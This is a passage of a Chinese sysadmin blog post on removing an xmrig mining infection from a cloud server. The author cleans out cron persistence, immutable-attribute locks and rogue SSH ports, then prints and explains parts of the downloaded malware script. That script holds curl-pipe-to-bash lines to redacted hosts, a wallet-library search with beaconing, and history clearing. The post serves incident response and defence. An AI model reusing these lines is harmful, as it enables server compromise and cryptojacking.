aria-label="安卓相关"><!---->安卓相关<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/kaiyuan/jumpserver/" aria-label="JumpServer"><!---->JumpServer<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="云服务"><!--[--><!---->云服务<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/cloud/aliyun/" aria-label="阿里云"><!---->阿里云<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/cloud/tengxunyun/" aria-label="腾讯云"><!---->腾讯云<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/cloud/aws/" aria-label="亚马逊云"><!---->亚马逊云<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/cloud/other/" aria-label="其他"><!---->其他<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/safe/" aria-label="服务器安全"><!---->服务器安全<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/software/" aria-label="常用软件"><!---->常用软件<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/internet/" aria-label="互联网福利"><!---->互联网福利<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/debug/" aria-label="调试Debug"><!---->调试Debug<!----></a></div><div class="vp-nav-item hide-in-mobile"><a class="auto-link external-link" href="https://github.com/funet8/vuepress-v2.xgss.net.git" aria-label="GitHub" rel="noopener noreferrer" target="_blank"><!---->GitHub<!----></a></div></nav><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!----><div class="vp-nav-item hide-in-mobile"><button type="button" class="vp-color-mode-switch" id="color-mode-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" name="auto" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" name="dark" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" name="light" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar" vp-sidebar><!----><ul class="vp-sidebar-links"><li><a class="route-link auto-link vp-sidebar-link" href="/" aria-label="首页"><!---->首页<!----></a></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">ChatGPT</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">开源</span><span class="vp-arrow end"></span></button><!----></section></li><li><a class="route-link auto-link vp-sidebar-link" href="/linux-basis/" aria-label="基础知识"><!---->基础知识<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/internet2025/" aria-label="互联网2025"><!---->互联网2025<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/NAS/" aria-label="NAS"><!---->NAS<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/Rocky-Linux/" aria-label="Rocky-Linux"><!---->Rocky-Linux<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/safe/" aria-label="网络安全"><!---->网络安全<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/mysql/" aria-label="MySQL"><!---->MySQL<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/nginx/" aria-label="Nginx"><!---->Nginx<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/shell/" aria-label="Shell"><!---->Shell<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/Ubuntu/" aria-label="Ubuntu"><!---->Ubuntu<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/hardware/" aria-label="硬件"><!---->硬件<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/git/" aria-label="Git"><!---->Git<!----></a></li></ul><!----></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!----><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->20230817-阿里云美国某节点服务器被挂挖矿恶意软件的解决</h1><div class="page-info"><!----><!----><span class="page-date-info" aria-label="Writing Date📅" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon" name="calendar"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span data-allow-mismatch="text">6/5/25</span><meta property="datePublished" content="2025-06-05T08:18:16.000Z"></span><!----><span class="page-reading-time-info" aria-label="Reading Time⌛" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon" name="timer"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>About 20 min</span><meta property="timeRequired" content="PT20M"></span><!----><!----></div><hr></div><!----><div class="" vp-content><!----><div id="markdown-content"><h1 id="_20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法-分析恶意脚本" tabindex="-1"><a class="header-anchor" href="#_20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法-分析恶意脚本"><span>20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法，分析恶意脚本</span></a></h1><h2 id="报警短信" tabindex="-1"><a class="header-anchor" href="#报警短信"><span>报警短信</span></a></h2><p>凌晨收到告警短信，爬起来解决问题先。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>【某里云】尊敬的XXXX - XXXX ,云监控-云服务器ECS&lt;美西-XXX-XXX-XXX/XXX.XXX.XXX.XXX&gt;于&lt;2023-08-17 02:17:32&gt;发生报警，(Agent)cpu.total（99.78%&gt;=80%），持续时间0分钟</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="ssh远程进入系统" tabindex="-1"><a class="header-anchor" href="#ssh远程进入系统"><span>SSH远程进入系统</span></a></h2><p>查看原因</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>top查看负载</span></span>
+<span class="line"><span>有一个熟悉有陌生的进程 xmrig 挖矿软件</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ps aux |grep xmrig</span></span>
+<span class="line"><span>/etc/.system/php/xmrig --config=/etc/.system/php/config.json </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>kill掉进程</span></span>
+<span class="line"><span>进程杀不到，杀了又启动一个</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>于是删除目录： </span></span>
+<span class="line"><span>rm -rf /etc/.system/</span></span>
+<span class="line"><span>再杀进程，发现进程没有了，</span></span>
+<span class="line"><span>不出意外过几分钟可能会再次启动的。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>判断服务器是被挂了挖矿的恶意软件！</p><p><img src="https://imgoss.xgss.net/picgo/bingdu-ecs-guama.jpg?aliyun" alt="bingdu-ecs-guama"></p><h2 id="查看定时任务" tabindex="-1"><a class="header-anchor" href="#查看定时任务"><span>查看定时任务</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>ll /etc/crontab</span></span>
+<span class="line"><span>-rw-r--r-- 1 root root 151 May 15  2018 /etc/crontab</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>cat /etc/crontab</span></span>
+<span class="line"><span>*/30 * * * * root curl -fsSL http://XXX.XXX.XXX.XXX/php/php_8020.sh | bash </span></span>
+<span class="line"><span>*/30 * * * * root cd1 -fsSL http://XXX.XXX.XXX.XXX/php/php_8020.sh | bash </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>ll /etc/cron</span></span>
+<span class="line"><span>cron.d/       cron.daily/   cron.deny     cron.hourly/  cron.monthly/ crontab       crontab~      crontaz~      cron.weekly/  </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>刻意的文件有</span></span>
+<span class="line"><span>crontab       crontab~      crontaz~ </span></span>
+<span class="line"><span>文件内容都是 每30分钟从 某个IP中下载一个恶意脚本并且执行</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="无法编辑" tabindex="-1"><a class="header-anchor" href="#无法编辑"><span>无法编辑</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chmod 777 -R /etc/crontab</span></span>
+<span class="line"><span>chmod: changing permissions of ‘/etc/crontab’: Operation not permitted</span></span>
+<span class="line"><span>vi /etc/crontab 也没有权限</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解决：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
+<span class="line"><span>chattr -ia /var/spool/cron</span></span>
+<span class="line"><span>chattr -ia /etc/crontab</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>vi /etc/crontab</span></span>
+<span class="line"><span>rm -rf   /etc/crontab~</span></span>
+<span class="line"><span>rm -rf /etc/crontaz~</span></span>
+<span class="line"><span>systemctl restart crond</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="去掉远程密钥登录" tabindex="-1"><a class="header-anchor" href="#去掉远程密钥登录"><span>去掉远程密钥登录</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># netstat -tunpl|grep ssh</span></span>
+<span class="line"><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      28838/sshd          </span></span>
+<span class="line"><span>tcp        0      0 0.0.0.0:11222           0.0.0.0:*               LISTEN      28838/sshd          </span></span>
+<span class="line"><span>tcp        0      0 0.0.0.0:XXXX           0.0.0.0:*               LISTEN      28838/sshd     本机正在的ssh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
+<span class="line"><span>chattr -ia /etc/ssh/sshd_config </span></span>
+<span class="line"><span>编辑</span></span>
+<span class="line"><span>vi /etc/ssh/sshd_config </span></span>
+<span class="line"><span>把恶意的端口22和11222 关闭掉</span></span>
+<span class="line"><span>vi /etc/ssh/sshd_config</span></span>
+<span class="line"><span>systemctl restart sshd </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># netstat -tunpl|grep ssh</span></span>
+<span class="line"><span>tcp        0      0 0.0.0.0:60920           0.0.0.0:*               LISTEN      1214/sshd</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="在某云控制台中设置安全组只运行自己的ip登录ssh" tabindex="-1"><a class="header-anchor" href="#在某云控制台中设置安全组只运行自己的ip登录ssh"><span>在某云控制台中设置安全组只运行自己的ip登录SSH</span></a></h2><p><img src="https://imgoss.xgss.net/picgo/image-20230817101528002.png?aliyun" alt="image-20230817101528002"></p><p>保证其他人无法登录ssh</p><h1 id="下载恶意代码分析" tabindex="-1"><a class="header-anchor" href="#下载恶意代码分析"><span>下载恶意代码分析</span></a></h1><p>下载恶意脚本的代码，看一下如何解决这个问题，一段一段的来分析是怎么挂马的</p><h2 id="_1-修改-resolv-conf文件" tabindex="-1"><a class="header-anchor" href="#_1-修改-resolv-conf文件"><span>1.修改 resolv.conf文件</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>于是我决定下载 http://XXX.XXX.XXX.XXX/php/php_8020.sh 然后分析一下</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="恶意代码" tabindex="-1"><a class="header-anchor" href="#恶意代码"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#!/bin/bash -e</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>VERSION=22.06</span></span>
+<span class="line"><span>ulimit -n 65535 </span></span>
+<span class="line"><span>function SetupNameServers(){  </span></span>
+<span class="line"><span>grep -q 8.8.8.8 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; echo &quot;nameserver 8.8.8.8&quot; &gt;&gt; /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null</span></span>
+<span class="line"><span>grep -q 8.8.4.4 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; echo &quot;nameserver 8.8.4.4&quot; &gt;&gt; /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>SetupNameServers</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>修改dns</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决" tabindex="-1"><a class="header-anchor" href="#解决"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>vi  /etc/resolv.conf</span></span>
+<span class="line"><span>options timeout:2 attempts:3 rotate single-request-reopen</span></span>
+<span class="line"><span>; generated by /usr/sbin/dhclient-script</span></span>
+<span class="line"><span>nameserver 100.100.2.136</span></span>
+<span class="line"><span>nameserver 100.100.2.138</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>nameserver 8.8.8.8</span></span>
+<span class="line"><span>nameserver 8.8.4.4</span></span>
+<span class="line"><span>把文件改成</span></span>
+<span class="line"><span>vi  /etc/resolv.conf</span></span>
+<span class="line"><span>options timeout:2 attempts:3 rotate single-request-reopen</span></span>
+<span class="line"><span>; generated by /usr/sbin/dhclient-script</span></span>
+<span class="line"><span>nameserver 100.100.2.136</span></span>
+<span class="line"><span>nameserver 100.100.2.138</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_2-搜索关键字" tabindex="-1"><a class="header-anchor" href="#_2-搜索关键字"><span>2.搜索关键字</span></a></h2><h3 id="恶意代码-1" tabindex="-1"><a class="header-anchor" href="#恶意代码-1"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>if [ -f ~/ /home -maxdepth 6 -name &#39;trc20usdt&#39; ] # 它在指定的目录（~ 或 /home）下搜索名为 &#39;trc20usdt&#39; 的文件，并且搜索的深度不超过 6 层子目录。如果找到了符合条件的文件，条件将被视为满足，对应的代码块将会执行。</span></span>
+<span class="line"><span>  then</span></span>
+<span class="line"><span>    echo &quot;Crypto running&quot;</span></span>
+<span class="line"><span>    curl 6nj0me.XXXX.io  # 上报地址做了修改。</span></span>
+<span class="line"><span>    curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
+<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;TronWeb&#39; ]</span></span>
+<span class="line"><span>    then</span></span>
+<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
+<span class="line"><span>      curl 6nj0me.XXX.io # 地址做了修改</span></span>
+<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
+<span class="line"><span>      history -c </span></span>
+<span class="line"><span>      </span></span>
+<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;hdkey&#39; ]</span></span>
+<span class="line"><span>    then</span></span>
+<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
+<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
+<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
+<span class="line"><span>      history -c </span></span>
+<span class="line"><span>      </span></span>
+<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;ethers&#39; ]</span></span>
+<span class="line"><span>    then</span></span>
+<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
+<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
+<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
+<span class="line"><span>      history -c </span></span>
+<span class="line"><span>      </span></span>
+<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;web3&#39; ]</span></span>
+<span class="line"><span>    then</span></span>
+<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
+<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
+<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
+<span class="line"><span>      history -c </span></span>
+<span class="line"><span>      </span></span>
+<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;wormhole&#39; ]</span></span>
+<span class="line"><span>    then</span></span>
+<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
+<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
+<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
+<span class="line"><span>      history -c </span></span>
+<span class="line"><span>      </span></span>
+<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;bitcoin&#39; ]</span></span>
+<span class="line"><span>    then</span></span>
+<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
+<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
+<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
+<span class="line"><span>      history -c </span></span>
+<span class="line"><span>      </span></span>
+<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;binance&#39; ]</span></span>
+<span class="line"><span>    then</span></span>
+<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
+<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
+<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
+<span class="line"><span>      history -c </span></span>
+<span class="line"><span>      </span></span>
+<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;ethereum&#39; ]</span></span>
+<span class="line"><span>    then</span></span>
+<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
+<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
+<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
+<span class="line"><span>      history -c </span></span>
+<span class="line"><span>      </span></span>
+<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;hdwallet&#39; ]</span></span>
+<span class="line"><span>    then</span></span>
+<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
+<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
+<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
+<span class="line"><span>      history -c </span></span>
+<span class="line"><span>      </span></span>
+<span class="line"><span>  else</span></span>
+<span class="line"><span>      echo &quot;not Crypto running &quot;</span></span>
+<span class="line"><span>fi</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 